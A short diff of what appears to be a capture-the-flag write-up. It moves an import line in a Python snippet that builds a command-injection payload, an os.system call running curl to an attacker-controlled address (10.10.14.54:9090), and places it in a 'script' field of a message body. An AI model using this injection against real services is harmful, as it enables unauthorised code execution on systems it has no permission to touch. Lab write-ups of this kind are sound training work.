@@ -336,7 +336,7 @@ nimbus FAIL
 ``` python
 
 import subprocess
-
+import json
 payload = "curl http://10.10.14.54:9090"
 script = f'import os;os.system("{payload}")'
 
@@ -347,7 +347,7 @@ message_body = {
     "script": script
 }
 
-import json
+
 message_body_str = json.dumps(message_body)
 
 cmd = [
